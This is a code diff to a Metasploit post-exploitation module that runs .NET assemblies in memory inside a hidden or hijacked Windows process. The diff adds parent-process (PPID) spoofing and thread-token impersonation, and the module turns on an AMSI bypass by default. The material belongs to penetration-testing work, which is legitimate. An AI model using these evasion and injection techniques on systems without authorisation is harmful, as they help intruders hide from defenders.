@@ -17,7 +17,6 @@ class MetasploitModule < Msf::Post
       'Name' => 'Execute .net Assembly (x64 only)',
       'Description' => '
         This module execute a .net assembly in memory. Reflectively load the dll that will host CLR, then
-        
         copy in memory the assembly that will be executed. Credits for Amsi bypass to Rastamouse (@_RastaMouse)
       ',
       'License' => MSF_LICENSE,
@@ -35,7 +34,9 @@ class MetasploitModule < Msf::Post
         OptPath.new('ASSEMBLYPATH', [false, 'Assembly directory', ::File.join(Msf::Config.data_directory, 'execute-assembly')]),
         OptString.new('ARGUMENTS', [false, 'Command line arguments']),
         OptString.new('PROCESS', [false, 'Process to spawn','notepad.exe']),
+        OptString.new('USETHREADTOKEN', [false, 'Spawn process with thread impersonation',true]),
         OptInt.new('PID', [false, 'Pid  to inject', 0]),
+	OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
         OptBool.new('AMSIBYPASS', [true, 'Enable Amsi bypass', true]),
         OptInt.new('WAIT', [false, 'Time in seconds to wait', 10])
       ], self.class
@@ -102,13 +103,28 @@ class MetasploitModule < Msf::Post
   end
 
   def launch_process
+    if datastore['PPID'] != 0 and not pid_exists(datastore['PPID'])
+      print_error("Process #{datastore['PPID']} was not found")
+      return false
+    elsif datastore['PPID'] != 0
+      print_status("Spoofing PPID #{datastore['PPID']}")
+    end
     process_name = sanitize_process_name(datastore['PROCESS'])
     print_status("Launching #{process_name} to host CLR...")
     channelized = true
     if datastore['PID'] > 0
       channelized = false
     end
-    process = client.sys.process.execute(process_name, nil, 'Channelized' => channelized, 'Hidden' => true)
+    impersonation = true
+    if datastore['USETHREADTOKEN'] == false
+      impersonation = false
+    end
+    process = client.sys.process.execute(process_name, nil, {
+      'Channelized' => channelized, 
+      'Hidden' => true,
+      'UseThreadToken' => impersonation,
+      'ParentPid' => datastore['PPID']
+    })
     hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
     print_good("Process #{hprocess.pid} launched.")
     [process, hprocess]
@@ -126,14 +142,30 @@ class MetasploitModule < Msf::Post
   end
 
   def open_process
-    print_status('Warning: output unavailable')
-    print_status("Opening process #{datastore['PID']}...")
-    hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
-    print_good("Process #{hprocess.pid} hooked.")
-    [nil, hprocess]
+    pid = datastore['PID'].to_i
+
+    if pid_exists(pid)
+      print_status("Opening handle to process #{datastore['PID']}...")
+      hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
+      print_good('Handle opened')
+      [nil, hprocess]
+    else
+      print_bad('Pid not found')
+      [nil, nil]
+    end
   end
 
   def execute_assembly(exe_path)
+    print_status("Running module against #{sysinfo['Computer']}") unless sysinfo.nil?
+    if datastore['PID'] > 0 or datastore['WAIT'] == 0 or datastore['PPID'] > 0
+      print_warning('Output unavailable')
+    end
+
+    if datastore['PPID'] != 0 and datastore['PID'] != 0
+      print_error("PID and PPID are mutually exclusive")
+      return false
+    end
+
     if datastore['PID'] <= 0
       process, hprocess = launch_process
     else
@@ -150,7 +182,7 @@ class MetasploitModule < Msf::Post
       sleep(datastore['WAIT'])
     end
 
-    if datastore['PID'] <= 0 and datastore['WAIT'] > 0
+    if datastore['PID'] <= 0 and datastore['WAIT'] > 0 and datastore['PPID'] <= 0
       read_output(process)
     end
 
